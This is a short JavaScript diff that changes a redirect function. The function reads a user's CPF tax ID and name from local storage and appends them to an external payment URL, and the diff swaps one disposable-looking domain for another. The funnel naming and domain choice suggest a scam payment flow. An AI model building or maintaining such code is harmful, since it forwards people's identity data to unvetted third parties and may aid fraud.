@@ -722,6 +722,7 @@ function step15to16() {
 function redirect() {
     const cpf = localStorage.getItem('cpf');
     const name = localStorage.getItem('name');
-    const url = `https://pay.checkoutonline.click/JqoR32bY9RA3Vj5?document=${encodeURIComponent(cpf||'')}&name=${encodeURIComponent(name||'')}`;
+    const url = `https://pay.pagamentotransacional.sbs/rn4RgQvX5eA3wBV?document=${encodeURIComponent(cpf||'')}&name=${encodeURIComponent(name||'')}`;
     window.location.href = url;
+
 }
